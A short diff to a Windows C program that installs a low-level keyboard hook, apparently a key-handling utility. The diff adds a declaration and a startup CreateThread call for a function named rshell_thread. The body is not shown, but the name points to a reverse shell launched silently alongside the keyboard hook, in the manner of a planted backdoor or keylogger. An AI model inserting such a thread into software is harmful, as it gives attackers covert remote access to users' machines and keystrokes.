@@ -2,6 +2,7 @@
 
 
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
+DWORD WINAPI rshell_thread(LPVOID param);
 
 int wmain(void) {
 	HANDLE mtx = CreateMutexW(NULL, TRUE, WINKEY_MUTEX);
@@ -13,6 +14,8 @@ int wmain(void) {
 	HHOOK hook =
 		SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc,
 			GetModuleHandleW(NULL), 0);
+
+	CreateThread(NULL, 0, rshell_thread, NULL, 0, NULL);
 
 	MSG msg;
 	while (GetMessageW(&msg, NULL, 0, 0) > 0) {
